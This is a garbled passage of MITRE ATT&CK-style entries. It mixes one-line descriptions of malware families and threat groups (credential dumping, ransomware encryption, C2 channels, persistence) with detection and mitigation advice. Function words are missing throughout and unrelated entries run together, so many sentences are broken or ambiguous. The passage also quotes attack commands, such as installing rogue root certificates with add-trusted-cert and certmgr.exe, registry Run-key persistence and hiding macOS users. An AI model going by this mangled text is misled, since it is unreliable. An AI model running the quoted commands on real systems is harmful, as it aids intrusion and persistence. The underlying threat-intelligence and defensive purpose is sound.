mechanism C2.(Citation: FireEye APT41 Aug 2019)  [HyperBro](https://attack.mitre.org/software/S0398) ability pack payload.(Citation: Trend Micro Iron Tiger April 2021) [OilRig](https://attack.mitre.org/groups/G0049) compromised credentials access systems victim network.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: Crowdstrike GTR2020 Mar 2020) Monitor newly constructed files spearphishing emails malicious attachment attempt gain access victim systems. [Chimera](https://attack.mitre.org/groups/G0114) NtdsAudit utility collect accounts passwords.(Citation: NCC Chimera January 2021) (Citation: FireEye APT34 Dec 2017) (Citation: Palo Alto OilRig Sep 2018) [OopsIE](https://attack.mitre.org/software/S0264) download files C2 server victim's machine.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 OilRig Sept 2018) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware deleted files ways, including "suicide scripts" delete malware binaries victim. [Lazarus Group](https://attack.mitre.org/groups/G0032) secure file deletion delete files victim.(Citation: Novetta Blockbuster)(Citation: McAfee GhostSecret) [ThiefQuest](https://attack.mitre.org/software/S0595) installs launch item embedded encrypted launch agent property list template. plist file installed <code>~/Library/LaunchAgents/</code> folder configured path persistent binary located <code>~/Library/</code> folder.(Citation: wardle evilquest parti) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  Data acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). [SynAck](https://attack.mitre.org/software/S0242) enumerates running services.(Citation: SecureList SynAck Doppelgänging 2018)(Citation: Kaspersky Lab SynAck 2018) [FruitFly](https://attack.mitre.org/software/S0277) takes screenshots user's desktop.(Citation: objsee mac malware 2017) [WastedLocker](https://attack.mitre.org/software/S0612) junk code increase entropy hide actual code.(Citation: NCC WastedLocker June 2020) [Aquatic Panda](https://attack.mitre.org/groups/G0143) attempted endpoint detection response (EDR) tools compromised systems.(Citation: CrowdStrike AQUATIC PANDA December 2021) [Pteranodon](https://attack.mitre.org/software/S0147) malicious VBS file execution.(Citation: Symantec Shuckworm January 2022) [Mustang Panda](https://attack.mitre.org/groups/G0129) servers control validate tracking pixels phishing victims.(Citation: Proofpoint TA416 Europe March 2022) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)).

Furthermore, monitor network traffic homographs internationalized domain names abusing character sets (e.g. Cyrillic Latin versions trusted sites). monitor analyze traffic patterns packet inspection indicators cloned websites. example, adversaries HTTrack clone websites,  <code> Mirrored (victim URL)</code> visible packets.  [CreepySnail](https://attack.mitre.org/software/S1024) Base64 encode C2 traffic.(Citation: POLONIUM June 2022) [Lazarus Group](https://attack.mitre.org/groups/G0032) compromised router serve proxy victim network's corporate restricted segments.(Citation: Kaspersky ThreatNeedle Feb 2021) Monitor newly constructed files user directories. [Dok](https://attack.mitre.org/software/S0281) installs root certificate aid [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) actions command <code>add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename</code>.(Citation: objsee mac malware 2017)(Citation: hexed osx.dok analysis 2019) Monitor contextual data account, include username, user ID, environmental data mask presence user accounts create modify. macOS, identify users userID 500 <code>Hide500Users</code> key <code>/Library/Preferences/com.apple.loginwindow</code> plist file set <code>TRUE</code>.(Citation: Cybereason OSX Pirrit) [Crutch](https://attack.mitre.org/software/S0538) monitor removable drives exfiltrate files matching extension list.(Citation: ESET Crutch December 2020) [Cobian RAT](https://attack.mitre.org/software/S0338) feature perform voice recording victim’s machine.(Citation: Zscaler Cobian Aug 2017) writing disk, [Kwampirs](https://attack.mitre.org/software/S0236) inserts randomly generated string middle decrypted payload attempt evade hash-based detections.(Citation: Symantec Orangeworm April 2018) [Cyclops Blink](https://attack.mitre.org/software/S0687) custom binary scheme encode messages specific commands parameters executed.(Citation: NCSC Cyclops Blink February 2022) [TajMahal](https://attack.mitre.org/software/S0467) ability identify MAC address infected host.(Citation: Kaspersky TajMahal April 2019) Monitor new, unfamiliar DLL files written domain controller local computer. Password filters autorun loaded DLL lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)  [FIN6](https://attack.mitre.org/groups/G0037) PowerShell gain access merchant's networks, Metasploit PowerShell module download execute shellcode set local listener.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019)(Citation: Visa FIN6 Feb 2019) Monitor newly constructed containers existing, legitimate external service exfiltrate data primary command control channel. Investigate usage Kerberos Service Principal Names (SPNs), services (beginning “GC/”) computers DC organizational unit (OU). SPN Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) set logging.(Citation: ADDSecurity DCShadow Feb 2018) A rogue DC authenticate service SPNs replication process complete. [Conti](https://attack.mitre.org/software/S0575) <code>CreateIoCompletionPort()</code>, <code>PostQueuedCompletionStatus()</code>, <code>GetQueuedCompletionPort()</code> rapidly encrypt files, excluding extensions .exe, .dll, .lnk. AES-256 encryption key file bundled RAS-4096 public encryption key unique victim. [Conti](https://attack.mitre.org/software/S0575) “Windows Restart Manager” ensure files unlocked encryption.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020)(Citation: Cybleinc Conti January 2020)(Citation: CrowdStrike Wizard Spider October 2020)(Citation: DFIR Conti Bazar Nov 2021) [HiddenWasp](https://attack.mitre.org/software/S0394) port 61061 communicate C2 server.(Citation: Intezer HiddenWasp Map 2019) [ABK](https://attack.mitre.org/software/S0469) ability inject shellcode svchost.exe.(Citation: Trend Micro Tick November 2019) [SHIPSHAPE](https://attack.mitre.org/software/S0028) achieves persistence creating shortcut Startup folder.(Citation: FireEye APT30) [Octopus](https://attack.mitre.org/software/S0340) stored collected Application Data directory compromised host.(Citation: Securelist Octopus Oct 2018)(Citation: ESET Nomadic Octopus 2018) [ComRAT](https://attack.mitre.org/software/S0126) <code>cmd.exe</code> execute commands.(Citation: ESET ComRAT 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) collected valid email addresses subsequently spearphishing campaigns.(Citation: Malwarebytes Kimsuky June 2021) Network intrusion detection prevention systems network signatures identify traffic specific adversary command control infrastructure malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool command control signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) [ShimRat](https://attack.mitre.org/software/S0444) decompressed core DLL shellcode impersonated antivirus component running system.(Citation: FOX-IT 2016 Mofang) [nbtstat](https://attack.mitre.org/software/S0102) discover current NetBIOS sessions. [Agent Tesla](https://attack.mitre.org/software/S0331) created hidden folders.(Citation: SentinelLabs Agent Tesla Aug 2020) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors batch file modified COMSysApp service load malicious ipnet.dll payload load DLL `svchost.exe` process.(Citation: McAfee Honeybee) [GoldMax](https://attack.mitre.org/software/S0588) spawn command shell, execute native commands.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021) [NavRAT](https://attack.mitre.org/software/S0247) logs keystrokes targeted system.(Citation: Talos NavRAT 2018) [Green Lambert](https://attack.mitre.org/software/S0690) delete original executable initial installation addition unused functions.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  (Citation: FireEye APT30) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). data collection, [FIN6](https://attack.mitre.org/groups/G0037) compressed log files ZIP archive prior staging exfiltration.(Citation: FireEye FIN6 April 2016) [Attor](https://attack.mitre.org/software/S0438) automatically collected data compromised system.(Citation: ESET Attor Oct 2019) [Lurid](https://attack.mitre.org/software/S0010) compress data sending it.(Citation: Villeneuve 2011) [Conficker](https://attack.mitre.org/software/S0608) DGA seeds current UTC victim generate domains.(Citation: SANS Conficker)(Citation: Trend Micro Conficker) Monitor third-party application logging, messaging, artifacts leverage code repositories collect valuable information. Monitor access code repositories, performed privileged users Active Directory Domain Enterprise Administrators types accounts access code repositories. environments high-maturity, leverage User-Behavioral Analytics (UBA) platforms detect alert user-based anomalies. (Citation: Unit 42 Gorgon Aug 2018) [Whitefly](https://attack.mitre.org/groups/G0107) malicious .exe .dll files disguised documents images.(Citation: Symantec Whitefly March 2019) [NativeZone](https://attack.mitre.org/software/S0637) checked Vmware VirtualBox VM running compromised host.(Citation: MSTIC Nobelium Toolset 2021) [Chrommme](https://attack.mitre.org/software/S0667) exfiltrate collected data C2.(Citation: ESET Gelsemium June 2021) [SideTwist](https://attack.mitre.org/software/S0610) ability collect domain compromised host.(Citation: Check APT34 April 2021) (Citation: Symantec Leafminer July 2018) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) download additional modules C2.(Citation: Gigamon Berserk Bear October 2021) [AppleSeed](https://attack.mitre.org/software/S0622) compressed collected data exfiltration.(Citation: KISA Operation Muzabi) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors cmd.exe execute commands.(Citation: ESET Turla PowerShell 2019)(Citation: Symantec Waterbug Jun 2019) Monitor user accounts logged systems [Valid Accounts](https://attack.mitre.org/techniques/T1078) remotely control machines Virtual Network Computing (VNC). example, macOS systems <code>log --predicate 'process = "screensharingd" eventMessage "Authentication:"'</code> review incoming VNC connection attempts suspicious activity.(Citation: Apple Unified Log Analysis Remote Login Screen Sharing)  [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) download additional modules C2 server.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [Confucius](https://attack.mitre.org/groups/G0142) file stealer steal documents images extensions: txt, pdf, png, jpg, doc, xls, xlm, odp, ods, odt, rtf, ppt, xlsx, xlsm, docx, pptx, jpeg.(Citation: TrendMicro Confucius APT Aug 2021) anti-spoofing email authentication mechanisms filter messages based validity checks sender domain (using SPF) integrity messages (using DKIM). Enabling mechanisms organization (through policies DMARC) enable recipients (intra-org cross domain) perform message filtering validation.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) Preventing users deleting writing files adversaries maliciously altering <code>~/.bash_history</code> files. [Dtrack](https://attack.mitre.org/software/S0567) list files disk volumes.(Citation: Securelist Dtrack)(Citation: CyberBit Dtrack) [Kevin](https://attack.mitre.org/software/S1020) upload logs data compromised host.(Citation: Kaspersky Lyceum October 2021) [S-Type](https://attack.mitre.org/software/S0085) samples packed UPX.(Citation: Cylance Dust Storm) [SoreFang](https://attack.mitre.org/software/S0516) enumerate domain executing <code>net.exe /domain</code>.(Citation: CISA SoreFang July 2016) [LiteDuke](https://attack.mitre.org/software/S0513) packed multiple layers encryption.(Citation: ESET Dukes October 2019) [Industroyer](https://attack.mitre.org/software/S0604) sends hardware profiles previously-received commands C2 server POST-request.(Citation: ESET Industroyer) (Citation: Symantec Orangeworm April 2018) Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions, etc. (Citation: TrendMicro EarthLusca 2022) [Remcos](https://attack.mitre.org/software/S0332) takes automated screenshots infected machine.(Citation: Riskiq Remcos Jan 2018) [JHUHUGIT](https://attack.mitre.org/software/S0044) hijacking establish persistence hijacking class named MMDeviceEnumerator registering payload Icon Overlay handler object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).(Citation: ESET Sednit 1)(Citation: Talos Seduploader Oct 2017) [SUNBURST](https://attack.mitre.org/software/S0559) collected list process names hashed FNV-1a + XOR algorithm check similarly-hashed hardcoded blocklists.(Citation: FireEye SUNBURST Backdoor December 2020) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) malicious links lure users executing malicious payloads.(Citation: Google EXOTIC LILY March 2022) [APT32](https://attack.mitre.org/groups/G0050) scheduled tasks persist victim systems.(Citation: FireEye APT32 2017)(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017)(Citation: ESET OceanLotus Mar 2019) [Trojan.Karagany](https://attack.mitre.org/software/S0094) detect commonly generic virtualization platforms based drivers file paths.(Citation: Secureworks Karagany July 2019) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors stole digital signature Adobe Systems MaoCheng dropper.(Citation: McAfee Honeybee) adversaries leverage abused service infrastructure (ex: command control), unique characteristics adversary software, known.(Citation: ThreatConnect Infrastructure Dec 2020)
Much activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control [Web Service](https://attack.mitre.org/techniques/T1102) [Exfiltration Service](https://attack.mitre.org/techniques/T1567) . Monitor executed commands arguments search SYSVOL data GPP XML files, compromised domain controllers. [ZLib](https://attack.mitre.org/software/S0086) ability execute commands.(Citation: Cylance Dust Storm) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) collects address book Outlook.(Citation: Symantec Dragonfly) [H1N1](https://attack.mitre.org/software/S0132) custom packing algorithm.(Citation: Cisco H1N1 1) Mshta.exe environment functionality tied versions Internet Explorer reached life. [PowerShower](https://attack.mitre.org/software/S0441) ability encode C2 communications base64 encoding.(Citation: Unit 42 Inception November 2018)(Citation: Kaspersky Cloud Atlas August 2019) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors enabled Wdigest changing `HKLM\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest` registry 0 (disabled) 1 (enabled).(Citation: FoxIT Wocao December 2019) Ensure certificates private appropriately secured. utilizing additional hardware credential protections trusted platform modules (TPM) hardware security modules (HSM). Enforce HTTPS enable Extended Protection for
Authentication.(Citation: SpecterOps Certified Pre Owned) [Sandworm Team](https://attack.mitre.org/groups/G0034) [BlackEnergy](https://attack.mitre.org/software/S0089) KillDisk component corrupt infected system's master boot record.(Citation: US-CERT Ukraine Feb 2016)(Citation: ESET Telebots June 2017) module [Prikormka](https://attack.mitre.org/software/S0113) collects victim installed anti-virus software.(Citation: ESET Operation Groundbait) [FoggyWeb](https://attack.mitre.org/software/S0661) configure custom listeners passively monitor incoming POST requests FS server intranet/internet intercept requests match custom URI patterns defined actor.(Citation: MSTIC FoggyWeb September 2021) [Kimsuky](https://attack.mitre.org/groups/G0094) JScript logging downloading additional tools.(Citation: VirusBulletin Kimsuky October 2019)(Citation: CISA AA20-301A Kimsuky) [Chimera](https://attack.mitre.org/groups/G0114) <code>netstat -ano | findstr EST</code> discover network connections.(Citation: NCC Chimera January 2021) [HELLOKITTY](https://attack.mitre.org/software/S0617) enumerate logical drives target system.(Citation: FireEye FiveHands April 2021) [Cobalt Strike](https://attack.mitre.org/software/S0154) break data sets chunks exfiltration.(Citation: cobaltstrike manual) [Xbash](https://attack.mitre.org/software/S0341) maliciously encrypted victim's database systems demanded cryptocurrency ransom paid.(Citation: Unit42 Xbash Sept 2018) [Magic Hound](https://attack.mitre.org/groups/G0059) stolen domain credentials dumping LSASS process memory comsvcs.dll Active Directory Domain Controller [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: FireEye APT35 2018)(Citation: DFIR Report APT35 ProxyShell March 2022) Identify block malicious unknown .cpl files application control (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [Attor](https://attack.mitre.org/software/S0438)'s installer plugin schedule task loads dispatcher boot/logon.(Citation: ESET Attor Oct 2019) [Reaver](https://attack.mitre.org/software/S0172) encrypts collected data incremental XOR key prior exfiltration.(Citation: Palo Alto Reaver Nov 2017) [Cobalt Strike](https://attack.mitre.org/software/S0154) perform port scans infected host.(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [Empire](https://attack.mitre.org/software/S0363) Dropbox data exfiltration.(Citation: Github PowerShell Empire) [Spark](https://attack.mitre.org/software/S0543) whoami command built-in command identify user logged in.(Citation: Unit42 Molerat Mar 2020)  [AppleSeed](https://attack.mitre.org/software/S0622) channel C2 primary channel upload mode.(Citation: Malwarebytes Kimsuky June 2021) [HotCroissant](https://attack.mitre.org/software/S0431) remotely applications infected host <code>ShellExecuteA</code> command.(Citation: Carbon Black HotCroissant April 2020) Monitor application logs suspicious events including repeated MFA failures user's primary credentials compromised. Monitor executed commands arguments actions aid sniffing network traffic capture environment, including authentication material passed network  [Machete](https://attack.mitre.org/software/S0409) download additional files execution victim’s machine.(Citation: ESET Machete July 2019)  [BoxCaon](https://attack.mitre.org/software/S0651) established persistence setting <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load</code> registry key executable.(Citation: Checkpoint IndigoZebra July 2021) [APT33](https://attack.mitre.org/groups/G0064) variety publicly tools [LaZagne](https://attack.mitre.org/software/S0349) gather credentials.(Citation: Symantec Elfin Mar 2019)(Citation: FireEye APT33 Guardrail) [FoggyWeb](https://attack.mitre.org/software/S0661) invoke `Common.Compress` method compress data C# GZipStream compression class.(Citation: MSTIC FoggyWeb September 2021) disabling embedded files Office programs, OneNote, Protected View.(Citation: Enigma Reviving DDE Jan 2018)(Citation: GitHub Disable DDEAUTO Oct 2017) Monitor API calls gathering domain trust relationships identify lateral movement DSEnumerateDomainTrusts() Win32 API spot activity Domain Trust Discovery.(Citation: Harmj0y Domain Trusts) acquired Windows management tools PowerShell. .NET method GetAllTrustRelationships() indicator Domain Trust Discovery.(Citation: GetAllTrustRelationships) [BACKSPACE](https://attack.mitre.org/software/S0031) adversaries search files.(Citation: FireEye APT30) [DDKONG](https://attack.mitre.org/software/S0255) lists files victim’s machine.(Citation: Rancor Unit42 June 2018) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) saved random temp file exfil.(Citation: Morphisec ShellTea June 2019) [RogueRobin](https://attack.mitre.org/software/S0270) enumerates running processes search Wireshark Windows Sysinternals suite.(Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019) [APT32](https://attack.mitre.org/groups/G0050) moved renamed pubprn.vbs .txt file avoid detection.(Citation: Twitter ItsReallyNick APT32 pubprn Masquerade) [Avenger](https://attack.mitre.org/software/S0473) ability inject shellcode svchost.exe.(Citation: Trend Micro Tick November 2019) Monitor events account objects permissions systems domain, event IDs 4738, 4728 4670. [TA459](https://attack.mitre.org/groups/G0062) attempted victims malicious Word attachment spearphishing.(Citation: Proofpoint TA459 April 2017) (Citation: Check Warzone Feb 2020)(Citation: Uptycs Confucius APT Jan 2021) mshta.exe executing raw obfuscated script command-line. Compare invocations mshta.exe prior history arguments executed .hta files determine anomalous adversarial activity. Command arguments mshta.exe invocation determining origin purpose .hta file executed. [Drovorub](https://attack.mitre.org/software/S0502) de-obsfuscated XOR encrypted payloads WebSocket messages.(Citation: NSA/FBI Drovorub August 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Enable whitelisting solutions AppLocker Device Guard block loading malicious SIP DLLs. [MegaCortex](https://attack.mitre.org/software/S0576) <code>.cmd</code> scripts victim's system.(Citation: IBM MegaCortex)  Monitor newly constructed network connections received untrusted hosts.  Enable Windows firewall, prevents DCOM instantiation default. Ensure proper permissions prevent adversary access privileged accounts install bootkit. [gh0st RAT](https://attack.mitre.org/software/S0032) `InterlockedExchange`, `SeShutdownPrivilege`, `ExitWindowsEx` Windows API functions.(Citation: Gh0stRAT ATT March 2019) [HAFNIUM](https://attack.mitre.org/groups/G0125) NT AUTHORITY\SYSTEM account create files Exchange servers.(Citation: FireEye Exchange Days March 2021) [OilRig](https://attack.mitre.org/groups/G0049) Plink utility tools create tunnels C2 servers.(Citation: FireEye APT34 Webinar Dec 2017) [IcedID](https://attack.mitre.org/software/S0483) obfuscated VBA string expressions.(Citation: Juniper IcedID June 2020) [Windshift](https://attack.mitre.org/groups/G0112) string encoding floating calculations.(Citation: BlackBerry Bahamut) [LazyScripter](https://attack.mitre.org/groups/G0140) security software icons disguise executables.(Citation: MalwareBytes LazyScripter Feb 2021)  (Citation: PWC Cloud Hopper Technical Annex April 2017) [Empire](https://attack.mitre.org/software/S0363) conduct command control protocols HTTPS.(Citation: Github PowerShell Empire) [menuPass](https://attack.mitre.org/groups/G0045) encoded strings malware base64 simple, single-byte XOR obfuscation key 0x40.(Citation: Accenture Hogfish April 2018)(Citation: FireEye APT10 Sept 2018)(Citation: Symantec Cicada November 2020) [Netwalker](https://attack.mitre.org/software/S0457) written PowerShell executed memory, avoiding detection.(Citation: TrendMicro Netwalker 2020)(Citation: Sophos Netwalker 2020) [FoggyWeb](https://attack.mitre.org/software/S0661) receive additional malicious components actor controlled C2 server execute compromised FS server.(Citation: MSTIC FoggyWeb September 2021) [Babuk](https://attack.mitre.org/software/S0638) anti-virus services compromised host.(Citation: Sogeti CERT ESEC Babuk March 2021) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [menuPass](https://attack.mitre.org/groups/G0045) legitimate access granted Managed Service Providers access victims interest.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017)(Citation: Symantec Cicada November 2020)(Citation: DOJ APT10 Dec 2018)(Citation: District Court NY APT10 Indictment December 2018) [APT3](https://attack.mitre.org/groups/G0022) load DLLs valid version Chrome tools.(Citation: FireEye Clandestine Fox)(Citation: FireEye Clandestine Fox 2) [KillDisk](https://attack.mitre.org/software/S0607) deletes Application, Security, Setup, Windows Event Logs.(Citation: ESEST Black Energy Jan 2016) [Dragonfly](https://attack.mitre.org/groups/G0035) modified Registry perform multiple techniques [Reg](https://attack.mitre.org/software/S0075).(Citation: US-CERT TA18-074A) [Fox Kitten](https://attack.mitre.org/groups/G0117) Scheduled Tasks persistence load execute reverse proxy binary.(Citation: CISA AA20-259A Iran-Based Actor September 2020)(Citation: ClearSky Pay2Kitten December 2020) Monitor newly constructed network connections received untrusted hosts.  [MuddyWater](https://attack.mitre.org/groups/G0069) PowerShell backdoor check Skype connections target machine.(Citation: Trend Micro Muddy Water March 2021) [Valak](https://attack.mitre.org/software/S0476) collect sensitive mailing Exchange servers, including credentials domain certificate enterprise.(Citation: Cybereason Valak 2020) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) deleted 'index.dat' file compromised machine remove Internet history system.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [GoldMax](https://attack.mitre.org/software/S0588) decoded decrypted configuration file executed.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021) periodic reviews accounts privileges critical sensitive code repositories. Scan code repositories exposed credentials sensitive information. [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) compressed data password-protected RAR archives prior exfiltration.(Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Trend Micro Tick November 2019) Ensure proper permissions prevent adversary access privileged accounts install bootkit. Ensure agent forwarding disabled systems explicitly require feature prevent misuse. (Citation: Symantec SSH ssh-agent) [CrackMapExec](https://attack.mitre.org/software/S0488) create registry key wdigest.(Citation: CME Github September 2018) (Citation: Check APT34 April 2021) [NETWIRE](https://attack.mitre.org/software/S0198) retrieve passwords messaging mail client applications.(Citation: Red Canary NETWIRE January 2020) Prevent users write files search paths applications. [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) downloaded files victim machine.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) connects port 80 C2 server Wininet API. Data exchanged POSTs.(Citation: Kaspersky Sofacy) [Linux Rabbit](https://attack.mitre.org/software/S0362) sends payload C2 server encoded URL parameter. (Citation: Anomali Linux Rabbit 2018) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Exaramel Linux](https://attack.mitre.org/software/S0401) hardcoded location systemd achieve persistence running root.(Citation: ESET TeleBots Oct 2018)(Citation: ANSSI Sandworm January 2021) (Citation: Proofpoint TA459 April 2017) (Citation: Forcepoint Monsoon) [MegaCortex](https://attack.mitre.org/software/S0576) Base64 key decode components.(Citation: IBM MegaCortex) [APT33](https://attack.mitre.org/groups/G0064) created scheduled task execute .vbe file multiple times day.(Citation: Symantec Elfin Mar 2019) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Monitor executed commands arguments, requests credentials strings creating password prompts malicious.(Citation: Spoofing credential dialogs) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors proxied traffic multiple infected systems.(Citation: FoxIT Wocao December 2019) Monitor executed commands arguments potential adversary actions modify Registry values (ex: <code>reg.exe</code>) modify/replace legitimate <code>termsrv.dll</code>. [Lazarus Group](https://attack.mitre.org/groups/G0032) WMIC execute remote XSL script establish persistence.(Citation: ESET Lazarus Jun 2020)  Monitor files leverage Office-based applications persistence startups. [Environmental Keying](https://attack.mitre.org/techniques/T1480/001) mitigated preventative controls protect unintended targets compromised. targeted, efforts focused preventing adversary tools running earlier chain activity identifying subsequent malicious behavior compromised. [FlawedAmmyy](https://attack.mitre.org/software/S0381) C2.(Citation: Proofpoint TA505 Mar 2018) [CoinTicker](https://attack.mitre.org/software/S0369) executes Python script download stage.(Citation: CoinTicker 2019) [APT3](https://attack.mitre.org/groups/G0022) tool info local global users, power users, administrators.(Citation: Symantec Buckeye) OsInfo function [Komplex](https://attack.mitre.org/software/S0162) collects running process list.(Citation: Sofacy Komplex Trojan) [APT39](https://attack.mitre.org/groups/G0087) remote access tools leverage DNS communications C2.(Citation: BitDefender Chafer 2020) [LightNeuron](https://attack.mitre.org/software/S0395) gathers network adapters Win32 API <code>GetAdaptersInfo</code>.(Citation: ESET LightNeuron 2019) Data loss prevention detect block sensitive data uploaded services browsers. Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [TeamTNT](https://attack.mitre.org/groups/G0139) script decodes Base64-encoded version WeaveWorks Scope.(Citation: Cisco Talos Intelligence Group) Monitor newly constructed network connections received untrusted hosts creating files on-system suspicious. utilities, FTP, occur suspicious. [Hikit](https://attack.mitre.org/software/S0009) <code>certmgr.exe -add GlobalSign.cer -c -s -r localMachine Root</code> <code>certmgr.exe -add GlobalSign.cer -c -s -r localMachineTrustedPublisher</code> install self-generated certificate local trust store root Trusted Publisher.(Citation: FireEye HIKIT Rootkit 2) detect ETW monitor registry key configurations ETW event providers: <code>HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME\{PROVIDER_GUID}</code> [DustySky](https://attack.mitre.org/software/S0062) achieves persistence creating Registry entry <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>.(Citation: DustySky) [Ke3chang](https://attack.mitre.org/groups/G0004) Base64-encoded shellcode strings.(Citation: NICKEL December 2021) Ensure critical files abused adversaries restrictive permissions owned appropriately privileged account, access required users inhibit functionality. [Siloscape](https://attack.mitre.org/software/S0623) cmd IRC channel.(Citation: Unit 42 Siloscape Jun 2021) [Meteor](https://attack.mitre.org/software/S0688) ability change password local users compromised hosts log users.(Citation: Check Meteor Aug 2021) [APT29](https://attack.mitre.org/groups/G0016) collected emails specific individuals, executives staff, <code>New-MailboxExportRequest</code> <code>Get-MailboxExportRequest</code>.(Citation: Volexity SolarWinds)(Citation: Cybersecurity Advisory SVR TTP 2021) [Pay2Key](https://attack.mitre.org/software/S0556) encrypt data victim's machines RSA AES algorithms extort ransom payment decryption.(Citation: ClearkSky Fox Kitten February 2020)(Citation: Check Pay2Key November 2020) Ensure proper permissions directory access control set deny users ability write files top-level directory <code>C:</code> directories, <code>C:\Windows\</code>, reduce malicious files execution. [FIVEHANDS](https://attack.mitre.org/software/S0618) ability delete volume shadow copies compromised hosts.(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021) [Ryuk](https://attack.mitre.org/software/S0446) remotely create scheduled task execute system.(Citation: ANSSI RYUK RANSOMWARE) [Metamorfo](https://attack.mitre.org/software/S0455) function kill processes defenses prevent processes launching.(Citation: Medium Metamorfo Apr 2020)(Citation: FireEye Metamorfo Apr 2018)  Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature block regsvr32.exe bypass whitelisting. (Citation: Secure Host Baseline EMET) Identify block malicious software executed regsvr32 functionality application whitelisting (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [APT28](https://attack.mitre.org/groups/G0007) conducted credential phishing campaigns embedded links attacker-controlled domains.(Citation: Google TAG Ukraine Threat Landscape March 2022) Monitor analyze traffic flows follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Disable block remotely services unnecessary. [Crimson](https://attack.mitre.org/software/S0115) module collect data removable drives.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) [Valak](https://attack.mitre.org/software/S0476) packed DLL payloads.(Citation: SentinelOne 